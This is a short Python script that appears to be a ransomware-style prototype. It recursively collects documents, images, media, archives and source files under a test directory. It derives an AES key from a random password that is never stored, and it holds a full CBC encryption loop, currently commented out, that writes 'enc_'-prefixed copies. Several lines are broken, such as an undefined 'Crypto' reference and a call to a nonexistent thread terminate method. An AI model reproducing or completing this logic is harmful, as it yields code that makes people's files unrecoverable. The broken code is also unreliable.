import random
import string
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
import threading
import os
import sys
from os import walk

encryption_timeout = 120
encrypted_symbol = "enc_"
ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
base_path = "/TestFiles/Text/1500KB"

def EncryptFile(fileToEncrypt, key):
    file_size = str(os.path.getsize(fileToEncrypt)).zfill(16)
    dir_path, file_name = os.path.split(fileToEncrypt)
    
    iv = Crypto.Random.OSRNG.posix.new().read(AES.block_size)
    print("xxxxxxxxxxxxxxxxxxx: " + iv)

    aes_obj = AES.new(key, AES.MODE_CBC, iv)

    # with open(fileToEncrypt, 'rb') as infile:
    #     with open(os.path.join(dir_path, encrypted_symbol + file_name), 'wb') as outfile:
    #         outfile.write(file_size.encode('utf-8'))
    #         outfile.write(iv)

    #         while True:
    #             chunk = infile.read(64 * 1024)
    #             if len(chunk) == 0:
    #                 break
    #             elif len(chunk) % 16 != 0:
    #                 chunk += b' ' * (16 - (len(chunk) % 16))

    #             outfile.write(aes_obj.encrypt(chunk))
    pass

def EncryptAllFiles(filesToEncrypt, key):
    for file_to_encrypt in filesToEncrypt:
        EncryptFile(file_to_encrypt, key)

def GetAllFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        if os.path.isdir(fullPath):
            allFiles = allFiles + GetAllFiles(fullPath)
        else:
            if fullPath.endswith(ext):
                allFiles.append(fullPath)
    return allFiles

def StartEncryption():
    files_to_encrypt = GetAllFiles(base_path)
    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
    key = SHA256.new(password.encode('utf-8')).digest()
    EncryptAllFiles(files_to_encrypt, key)

###################### main ######################

enc_thread = threading.Thread(target=StartEncryption)
enc_thread.daemon = True
enc_thread.start()
enc_thread.join(encryption_timeout)

if enc_thread.is_alive():
    print("terminated")
    enc_thread.terminate()
    enc_thread.join()
